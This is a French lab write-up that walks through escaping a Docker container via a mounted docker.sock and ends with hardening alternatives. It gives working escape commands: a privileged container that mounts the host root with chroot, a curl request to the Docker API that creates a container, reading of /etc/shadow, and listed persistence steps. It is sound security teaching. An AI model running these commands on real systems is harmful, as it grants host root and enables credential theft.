# Scénario d'attaque — Container Escape via `/var/run/docker.sock`

> Document pédagogique. Toutes les manipulations doivent être réalisées dans
> votre laboratoire local (WSL2 + Docker Desktop ou VM Linux dédiée).

---

## 0. Contexte business — pourquoi cette mauvaise pratique existe-t-elle ?

Le projet **Internal Document Portal** intègre une page **« System Health »**
réservée aux administrateurs (visible dans la sidebar du dashboard quand on
se connecte en `admin@company.local`). Cette page :

- liste les conteneurs Docker en cours d'exécution sur l'hôte ;
- affiche les images Docker disponibles ;
- montre la version du Docker Engine, le kernel, l'OS, etc.

Pour que cette feature fonctionne, le développeur a fait un choix très
courant en entreprise : **monter `/var/run/docker.sock` dans le conteneur
applicatif**.

C'est le même schéma que l'on retrouve dans :

- **Portainer** (UI de management Docker) ;
- **Watchtower** (auto-update de conteneurs) ;
- **Traefik** (reverse-proxy avec auto-discovery des conteneurs) ;
- **Jenkins / GitLab Runners** qui buildent des images dans leur propre
  conteneur (pattern "Docker-in-Docker via socket") ;
- la majorité des dashboards internes "maison" ;
- les scripts CI qui exécutent `docker build` / `docker push`.

> C'est une **mauvaise pratique très répandue** : elle est rarement
> identifiée comme dangereuse parce qu'elle est *pratique*, *simple à
> implémenter* et *citée dans énormément de tutoriels en ligne*.

L'attaque ci-dessous démontre concrètement pourquoi cette feature, aussi
légitime soit-elle métier, **donne en réalité root sur l'hôte** à toute
personne capable d'exécuter du code dans le conteneur applicatif.

---

## Architecture compromise

```
Hôte (Linux / WSL2)
 └─ Docker Engine
     └─ Conteneur idp-app
         └─ Node.js / Express  (Internal Document Portal)
             ├─ /api/login, /api/files, /api/upload  (features publiques)
             └─ /api/admin/system                    (feature admin)
                 └─ http://unix:/var/run/docker.sock  ← MONTÉ DEPUIS L'HÔTE
```

---

## Phase 1 — Application légitime

L'utilisateur accède à [http://localhost:3000](http://localhost:3000) :

1. il se connecte avec `employee@company.local / password123` ;
2. il consulte des documents internes ;
3. il upload un fichier.

Un administrateur peut, en plus, consulter la page **System Health**
(`admin@company.local / admin123`) qui affiche les conteneurs Docker.
**Tout fonctionne normalement.**

---

## Phase 2 — Compromission du conteneur

On suppose que l'attaquant a obtenu un shell dans le conteneur. Vecteurs
réalistes de compromission applicative :

- une RCE applicative (injection de commande dans un endpoint d'upload mal
  filtré, déserialisation, template injection, etc.) ;
- une fuite de credentials donnant accès à un endpoint de debug ;
- une dépendance npm compromise (typosquatting / supply chain) ;
- une exploitation d'un autre service voisin sur le même réseau Docker.

Dans le cadre du TP, on **simule** cette étape avec :

```bash
docker exec -it idp-app bash
```

À partir de cet instant, l'attaquant a le rôle d'un **processus exécuté à
l'intérieur du conteneur applicatif**.

---

## Phase 3 — Découverte

Depuis le shell du conteneur :

```bash
id
# uid=0(root) gid=0(root) groups=0(root)         ← PROBLÈME 1 : root dans le conteneur

ls -l /var/run/docker.sock
# srw-rw---- 1 root root 0 ... /var/run/docker.sock   ← PROBLÈME 2 : socket Docker monté

which docker && docker --version
# Le client Docker est présent (installé dans le Dockerfile pour la feature System Health)
```

L'attaquant constate :

1. Il tourne en **root** dans le conteneur.
2. Le socket Docker (`/var/run/docker.sock`) est accessible.
3. Le client `docker` est installé localement.
4. La feature « System Health » de l'app prouve que le socket fonctionne :

   ```bash
   curl --unix-socket /var/run/docker.sock http://localhost/version
   ```

→ Il peut maintenant **piloter le Docker Engine de l'hôte** comme s'il était
administrateur de la machine.

---

## Phase 4 — Exploitation : prendre le contrôle de Docker Engine

```bash
docker -H unix:///var/run/docker.sock version
docker -H unix:///var/run/docker.sock ps -a
docker -H unix:///var/run/docker.sock images
```

Tout fonctionne : depuis le conteneur, on dialogue directement avec le
Docker de l'hôte. C'est exactement la même API que celle consommée par la
feature « System Health » légitime — sauf qu'on l'utilise pour tout autre
chose.

---

## Phase 5 — Container Escape : shell root sur l'hôte

L'attaquant lance un nouveau conteneur qui monte la racine de l'hôte (`/`)
à l'intérieur de lui-même :

```bash
docker -H unix:///var/run/docker.sock run --rm -it \
    --privileged \
    --pid=host \
    -v /:/host \
    alpine chroot /host sh
```

À l'intérieur de ce nouveau conteneur :

```sh
hostname        # ← nom de l'hôte, plus celui du conteneur
cat /etc/shadow # ← lecture des hashes des mots de passe de l'hôte
ls /root        # ← répertoire root de l'hôte
crontab -l      # ← persistance possible
```

→ **Container Escape réussi.** L'attaquant possède un shell **root** sur la
machine hôte alors qu'il était au départ confiné dans une simple application
documentaire.

---

## Phase 6 — Post-exploitation possible

Une fois sur l'hôte, l'attaquant peut :

- déposer une clé SSH dans `/root/.ssh/authorized_keys` ;
- créer un utilisateur persistant ;
- pivoter vers d'autres conteneurs via le Docker Engine
  (par exemple lire les volumes d'une base de données, intercepter du trafic
  via un conteneur sniffer connecté au même réseau, etc.) ;
- exfiltrer secrets / variables d'environnement / certificats ;
- déployer un cryptominer.

---

## Variantes de l'attaque

### Variante A — Sans `--privileged`

Le simple montage de `/var/run/docker.sock` suffit : le conteneur applicatif
n'a pas besoin d'être privilégié au départ. C'est *le conteneur que l'on
lance après* qui est privilégié.

### Variante B — Sans client Docker installé

L'API Docker est une simple API HTTP sur socket UNIX. On peut l'attaquer
directement avec `curl` :

```bash
curl --unix-socket /var/run/docker.sock \
  -X POST -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create
```

→ Même un conteneur très minimaliste peut exploiter la vulnérabilité.

### Variante C — Image normale (sans curl, sans docker)

L'attaquant peut toujours installer `apk add curl docker` (ou équivalent)
puisqu'il est root dans le conteneur. La défense « il n'y a pas de docker
installé » est donc **inutile**.

---

## Captures à réaliser pour le rapport

1. Page de login + dashboard de l'application (vue employé).
2. Vue admin : page **System Health** légitime affichant les conteneurs.
3. `docker exec -it idp-app bash` — entrée dans le conteneur.
4. `id` montrant `uid=0(root)`.
5. `ls -l /var/run/docker.sock` montrant le socket monté.
6. `docker ps` exécuté **depuis le conteneur**.
7. Lancement du conteneur d'évasion avec `chroot /host sh`.
8. `hostname` + `cat /etc/shadow` — preuve du Container Escape.
9. Démarrage en mode durci (`docker compose -f docker-compose.secure.yml up`)
   et démonstration que :
   - la page System Health affiche l'erreur « Docker Engine inaccessible » ;
   - `docker ps` depuis le conteneur retourne une erreur ;
   - `id` retourne un uid non-root.

---

## Conclusion pédagogique

Le **vrai message** du TP n'est pas seulement « ne montez pas le socket
Docker », mais surtout :

> **Une feature métier légitime peut introduire une vulnérabilité critique
> si on choisit la solution la plus simple sans en mesurer les
> conséquences.**

La feature « System Health » de notre portail correspond à un besoin réel
(monitoring infra). La mauvaise pratique vient du *choix d'implémentation* :
monter `docker.sock` directement plutôt que :

- lire les métriques via **Prometheus + Node Exporter / cAdvisor** ;
- passer par un **socket-proxy filtrant** (lecture seule) ;
- déléguer l'orchestration à **Kubernetes** + RBAC + ServiceAccount ;
- exposer une **API distante TLS authentifiée** côté Docker Engine.

Voir [`HARDENING.md`](HARDENING.md) pour les contre-mesures complètes.
